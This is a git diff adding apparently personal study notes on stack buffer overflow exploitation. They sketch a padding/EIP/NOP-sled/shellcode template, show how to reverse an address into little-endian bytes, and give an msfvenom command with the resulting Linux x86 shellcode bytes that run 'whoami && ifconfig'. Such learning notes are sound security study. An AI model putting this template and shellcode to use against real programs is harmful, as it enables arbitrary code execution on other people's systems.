@@ -6,6 +6,10 @@ if program takes input as parameter such as ./program  $(echo 'myparameter')
 or if if program prompts as user input. ./program <<<$(echo "user input")
 
 
+python script = buffer = A * number to break
+                EIP = \x\x\x\x
+                nop = '\x90' * 10
+                shell = c * 30
 using gdb 
 info functions
 
@@ -41,3 +45,20 @@ right after the heap one below
 end of the stack (END ADDR) column
 
 
+take four of them and reverse one of with \x between them in the script 
+0xf7de3b59 = \x59\x3b\xde\xf7
+put them in the eip section of the code
+
+
+msfvenom -p linux/x86/exec CMD="whoami && ifconfig" -b '\x00' -f python
+replace this code with shellcode
+buf =  b""
+buf += b"\xda\xd5\xb8\x27\xc2\xd7\x34\xd9\x74\x24\xf4\x5b"
+buf += b"\x33\xc9\xb1\x0e\x31\x43\x19\x83\xeb\xfc\x03\x43"
+buf += b"\x15\xc5\x37\xbd\x3f\x51\x21\x10\x26\x09\x7c\xf6"
+buf += b"\x2f\x2e\x16\xd7\x5c\xd8\xe7\x4f\x8c\x7a\x81\xe1"
+buf += b"\x5b\x99\x03\x16\x48\x5d\xa4\xe6\x18\x35\xcb\x87"
+buf += b"\x8b\xac\x33\x6e\x72\x0e\x5d\x08\x19\x21\xf3\xb2"
+buf += b"\xb4\xda\x0b\x6c\x14\xad\xed\x5f\x1a"
+
+sometimes i have to regenerate my shell code by running msfvenom command
